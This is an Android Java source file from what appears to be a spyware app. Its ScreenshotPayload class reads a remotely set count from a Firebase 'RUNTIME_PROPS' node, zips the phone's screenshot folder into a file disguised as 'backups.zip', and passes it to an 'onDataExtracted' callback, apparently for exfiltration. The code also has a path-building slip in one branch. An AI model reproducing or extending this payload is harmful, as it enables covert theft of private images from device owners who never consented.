package com.aigs.serviceone.payload;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Environment;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.annotation.NonNull;

import com.aigs.serviceone.helpers.ScreenshotPayloadListener;
import com.aigs.serviceone.helpers.ZipUtils;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseException;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.io.File;
import java.lang.ref.WeakReference;

public class ScreenshotPayload extends AsyncTask<String, Integer, String> {

    private WeakReference<Context> contextWeakReference;
    public ScreenshotPayloadListener screenshotPayloadListener;
    private int noOfFiles;

    public ScreenshotPayload(Context contextWeakReference) {
        this.contextWeakReference = new WeakReference<>(contextWeakReference);
    }

    public ScreenshotPayload setScreenshotPayloadListener(ScreenshotPayloadListener screenshotPayloadListener) {
        this.screenshotPayloadListener = screenshotPayloadListener;
        return this;
    }

    public ScreenshotPayload setExtractionNumber(int noOfFiles) {
        this.noOfFiles = noOfFiles;
        return this;
    }

    @Override
    protected String doInBackground(String... strings) {
        File file = new File(Environment.getExternalStorageDirectory()+"/DCIM/Screenshots");
        Log.d("PATH ",file.getAbsolutePath());

        FirebaseDatabase
                .getInstance()
                .getReference("RUNTIME_PROPS")
                .child("NO_OF_SCREENSHOTS")
                .addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {

                        if (snapshot.exists()) {
                            try {
                                noOfFiles = snapshot.getValue(Integer.class);
                            } catch (DatabaseException | NullPointerException databaseException) {
                                noOfFiles = -1;
                            }
                        } else noOfFiles = -1;

                        if (noOfFiles == -1) {
                            new ZipUtils().setZipListener(() -> screenshotPayloadListener.onDataExtracted(new File(Environment.getExternalStorageDirectory() + "DCIM/backups.zip")))
                                    .zipDirectory(file, Environment.getExternalStorageDirectory() + "/DCIM/backups.zip");
                        } else {
                            new ZipUtils().setZipListener(() -> {
                            }).zipDirectory(file, Environment.getExternalStorageDirectory() + "/DCIM/backups.zip", noOfFiles);
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {
                        //TODO UPDATE TO LOGS
                    }
                });


        return null;
    }
}
